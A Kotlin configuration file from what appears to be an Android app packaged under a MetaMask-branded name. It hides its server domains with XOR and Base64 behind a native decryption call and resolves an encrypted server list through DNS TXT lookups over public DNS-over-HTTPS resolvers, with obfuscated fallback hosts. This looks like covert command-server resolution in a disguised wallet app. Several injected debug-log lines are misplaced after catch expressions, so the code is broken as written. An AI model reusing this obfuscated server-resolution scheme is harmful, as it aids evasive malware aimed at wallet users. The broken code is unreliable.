package com.example.MetaMask.utils

import android.util.Log
import com.yourcompany.core.jni.NativeBridge
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

object RealityConfig {

    private const val TAG = "REALITY_CFG"

    const val VLESS_UUID = "d963a968-8a4a-4740-a008-4982f5eb30fb"

    // "all1.realdd.click" зашифрованный XOR+Base64
    private const val SEED_B64 = "Jw0CRU8BHBENCgFCCxkLVV4="

    // Fallback: vkadaw.click и petrodawd.click (зашифрованные host:port:pubKey)
    private val FALLBACK_B64 = listOf(
        "MAoPEAAEVxMNBwYHUk1WAgYLdnJJFQ0ULFURPypZHTJfOAQFUVt6Bll2J1Y/Mg4/ACosVjICPTwjfwwDQQ==",
        "NgQaBg4XGAcFQAYAARYJDA0FBgALIFEaQBAcMCgjDDJbLzwYG1ZYdgwIKUwYEQ0HFEQCGRA6B0Q9fX1ufgV3Cw=="
    )

    private val DNS_RESOLVERS = listOf(
        "https://dns.alidns.com/resolve",
        "https://dns.sb/dns-query",
        "https://dns.google/resolve",
        "https://cloudflare-dns.com/dns-query"
    )

    data class Server(val host: String, val port: Int, val publicKey: String)

    @Volatile private var servers: List<Server> = emptyList()
    private val idx = AtomicInteger(0)
    private val fetchMutex = Mutex()

    fun pickServer(): Server? {
        val list = servers
        if (list.isEmpty()) return null
        val server = list[idx.get() % list.size]
        Log.d(TAG, "pickServer → ${server.host}:${server.port}")
        return server
    }

    fun nextServer() {
        val list = servers
        if (list.size > 1) {
            val next = idx.incrementAndGet() % list.size
            Log.w(TAG, "nextServer → rotating to index $next (${list[next].host})")
        }
    }

    private fun decrypt(b64: String): String? = try {
        val r = NativeBridge.nativeDecryptDomain(b64)
        if (r.isEmpty()) null else r
    } catch (_: Exception) { null }
        android.util.Log.e("XDBG", "[RealityConfig] catch Exception ${_.javaClass.simpleName}: ${_.message}") //xdbg

    private fun parseServer(plain: String): Server? {
        android.util.Log.d("XDBG", "[RealityConfig] parseServer enter plain=${plain}") //xdbg
        val parts = plain.split(":")
        if (parts.size != 3) return null
        val port = parts[1].toIntOrNull() ?: return null
        return Server(parts[0], port, parts[2])
    }

    suspend fun fetch(): Boolean {
        if (!fetchMutex.tryLock()) return servers.isNotEmpty()
        try {
            val dnsName = decrypt(SEED_B64) ?: run { loadFallback(); return false }

            val client = OkHttpClient.Builder()
                .connectTimeout(5, TimeUnit.SECONDS)
                .readTimeout(5, TimeUnit.SECONDS)
                .build()

            val found = mutableListOf<Server>()
            var attempt = 0
            while (attempt < 3) {
                attempt++
                for (resolverUrl in DNS_RESOLVERS) {
                    try {
                        val url = "$resolverUrl?name=$dnsName&type=TXT&random=${System.currentTimeMillis()}"
                        val req = Request.Builder()
                            .url(url)
                            .header("Accept", "application/dns-json")
                            .build()
                        val resp = withContext(Dispatchers.IO) { client.newCall(req).execute() }
                        val body = resp.body?.string()
                        if (resp.isSuccessful && !body.isNullOrEmpty()) {
                            val json = JSONObject(body)
                            if (json.optInt("Status") == 0 && json.has("Answer")) {
                                val answers = json.getJSONArray("Answer")
                                for (i in 0 until answers.length()) {
                                    var enc = answers.getJSONObject(i).optString("data", "")
                                    if (enc.startsWith("\"") && enc.endsWith("\""))
                                        enc = enc.substring(1, enc.length - 1)
                                    val plain = decrypt(enc) ?: continue
                                    val srv = parseServer(plain) ?: continue
                                    if (found.none { it.host == srv.host }) found.add(srv)
                                }
                            }
                        }
                    } catch (_: Exception) {}
                        android.util.Log.e("XDBG", "[RealityConfig] catch Exception ${_.javaClass.simpleName}: ${_.message}") //xdbg
                }
                if (found.isNotEmpty()) {
                    servers = found
                    idx.set(0)
                    Log.i(TAG, "fetch OK: ${found.map { "${it.host}:${it.port}" }}")
                    return true
                }
                delay(5_000L)
            }
            loadFallback()
            return false
        } finally {
            fetchMutex.unlock()
        }
    }

    private fun loadFallback() {
        val list = FALLBACK_B64.mapNotNull { b64 ->
            val plain = decrypt(b64) ?: return@mapNotNull null
            parseServer(plain)
        }
        if (list.isNotEmpty()) {
            servers = list
            idx.set(0)
            Log.w(TAG, "fallback servers: ${list.map { "${it.host}:${it.port}" }}")
        }
    }
}
